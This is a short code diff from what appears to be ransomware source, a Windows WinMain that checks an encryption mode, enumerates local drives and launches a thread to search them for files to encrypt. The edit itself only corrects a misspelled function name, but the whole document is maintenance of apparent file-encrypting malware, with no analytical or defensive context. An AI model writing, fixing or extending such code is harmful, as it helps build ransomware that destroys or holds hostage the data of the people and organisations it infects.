@@ -445,7 +445,7 @@ int WINAPI WinMain(
 	
 	if (g_EncryptMode == LOCAL_ENCRYPT || g_EncryptMode == ALL_ENCRYPT) {
 
-		if (filesystem::EnumirateDrives(&DriveList)) {
+		if (filesystem::EnumerateDrives(&DriveList)) {
 			hLocalSearch = pCreateThread(NULL, 0, filesystem::StartLocalSearch, &DriveList, 0, NULL);
 		}
 
